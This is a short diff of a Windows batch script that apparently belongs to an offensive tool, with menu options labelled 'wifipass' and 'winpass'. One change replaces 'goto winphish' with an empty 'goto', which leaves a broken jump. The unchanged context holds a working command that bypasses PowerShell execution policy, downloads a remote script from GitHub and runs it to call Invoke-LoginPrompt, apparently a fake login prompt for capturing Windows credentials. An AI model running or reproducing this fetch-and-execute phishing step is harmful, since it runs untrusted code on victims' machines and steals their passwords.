@@ -117,7 +117,7 @@ goto wifipass
 )
 
 if /I "%input%" EQU "winpass" (
-goto winphish
+goto 
 )
 
 ) else (
@@ -273,7 +273,6 @@ exit
 echo Waiting...
 net use * /d /y >nul
 powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/syskey-del/powershell/main/update.ps1’)); Invoke-LoginPrompt
-echo.
 goto main
 
 exit
